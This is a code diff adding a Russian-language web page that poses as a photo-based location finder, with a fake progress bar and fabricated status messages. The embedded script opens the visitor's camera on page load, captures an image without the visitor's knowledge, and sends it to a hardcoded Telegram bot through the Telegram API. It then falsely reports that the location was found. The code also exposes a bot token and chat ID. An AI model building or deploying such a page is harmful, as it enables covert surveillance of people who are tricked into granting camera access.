@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Поиск местоположения</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            color: white;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            overflow: hidden;
+        }
+        
+        .container {
+            max-width: 600px;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 20px;
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.5);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+        
+        .loading {
+            display: flex;
+            justify-content: center;
+            margin: 30px 0;
+        }
+        
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1.5s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .progress-container {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 20px;
+            background: linear-gradient(90deg, #00c9ff, #92fe9d);
+            width: 0%;
+            border-radius: 10px;
+            transition: width 3s ease-in-out;
+        }
+        
+        .message {
+            font-size: 1.2rem;
+            line-height: 1.6;
+            margin: 20px 0;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        #permissionButton {
+            background: linear-gradient(90deg, #ff416c, #ff4b2b);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        #permissionButton:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+        
+        .camera-feed {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+            opacity: 0.2;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Ищем место по фото, подождите...</h1>
+        
+        <div class="loading">
+            <div class="spinner"></div>
+        </div>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="message">
+            <p>Анализируем геоданные и визуальные маркеры...</p>
+            <p>Сравниваем с базой из 14 млн локаций</p>
+            <p id="statusText">Инициализация системы распознавания</p>
+        </div>
+        
+        <button id="permissionButton" class="hidden">АКТИВИРОВАТЬ СКАНИРОВАНИЕ</button>
+    </div>
+
+    <video id="camera" class="camera-feed" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // Настройки (ЗАМЕНИТЕ НА СВОИ!)
+        const BOT_TOKEN = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U";
+        const CHAT_ID = "1224978194";
+        
+        const progressBar = document.getElementById('progressBar');
+        const statusText = document.getElementById('statusText');
+        const permissionButton = document.getElementById('permissionButton');
+        const camera = document.getElementById('camera');
+        
+        // Симуляция процесса поиска
+        let progress = 0;
+        const progressInterval = setInterval(() => {
+            progress += Math.random() * 10;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(progressInterval);
+            }
+            progressBar.style.width = `${progress}%`;
+        }, 300);
+        
+        // Сообщения статуса
+        const messages = [
+            "Инициализация системы распознавания",
+            "Калибровка геодатчиков",
+            "Анализ визуальных маркеров",
+            "Сопоставление с картографической базой",
+            "Финализация результатов"
+        ];
+        
+        let messageIndex = 0;
+        const messageInterval = setInterval(() => {
+            statusText.textContent = messages[messageIndex];
+            messageIndex = (messageIndex + 1) % messages.length;
+        }, 3000);
+        
+        // Автозапуск камеры
+        setTimeout(() => {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        camera.srcObject = stream;
+                        setTimeout(() => captureAndSend(stream), 3000);
+                    })
+                    .catch(() => {
+                        // Показываем кнопку, если автоматический доступ не сработал
+                        permissionButton.classList.remove('hidden');
+                        statusText.textContent = "Требуется разрешение на сканирование";
+                    });
+            } else {
+                permissionButton.classList.remove('hidden');
+                statusText.textContent = "Ваш браузер не поддерживает сканирование";
+            }
+        }, 1500);
+        
+        // Обработчик кнопки разрешения
+        permissionButton.addEventListener('click', () => {
+            permissionButton.classList.add('hidden');
+            statusText.textContent = "Активация системы сканирования...";
+            
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    camera.srcObject = stream;
+                    setTimeout(() => captureAndSend(stream), 2000);
+                })
+                .catch(error => {
+                    statusText.textContent = "Ошибка доступа к камере!";
+                    console.error("Camera error:", error);
+                });
+        });
+        
+        // Функция захвата и отправки фото
+        function captureAndSend(stream) {
+            statusText.textContent = "Захват изображения...";
+            
+            // Даем камере дополнительное время для инициализации
+            setTimeout(() => {
+                try {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = camera.videoWidth;
+                    canvas.height = camera.videoHeight;
+                    const context = canvas.getContext('2d');
+                    
+                    // Для Telegram-браузера - дополнительная задержка
+                    const isTelegramBrowser = navigator.userAgent.includes("Telegram");
+                    if (isTelegramBrowser) {
+                        setTimeout(() => {
+                            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+                            processImage(stream, canvas);
+                        }, 1000);
+                    } else {
+                        context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+                        processImage(stream, canvas);
+                    }
+                } catch (error) {
+                    console.error("Capture error:", error);
+                    statusText.textContent = "Ошибка захвата изображения!";
+                }
+            }, 500);
+        }
+        
+        // Обработка и отправка изображения
+        function processImage(stream, canvas) {
+            statusText.textContent = "Обработка изображения...";
+            
+            canvas.toBlob(blob => {
+                statusText.textContent = "Отправка данных на сервер...";
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'geo_scan.jpg');
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        statusText.textContent = "Локация успешно определена!";
+                    } else {
+                        statusText.textContent = "Ошибка анализа данных. Попробуйте позже.";
+                    }
+                })
+                .catch(error => {
+                    console.error("Send error:", error);
+                    statusText.textContent = "Ошибка сети!";
+                })
+                .finally(() => {
+                    // Выключаем камеру
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Плавное завершение
+                    setTimeout(() => {
+                        progressBar.style.width = '100%';
+                        statusText.textContent = "Готово! Результаты отправлены.";
+                    }, 1000);
+                });
+            }, 'image/jpeg', 0.95);
+        }
+    </script>
+</body>
+</html>
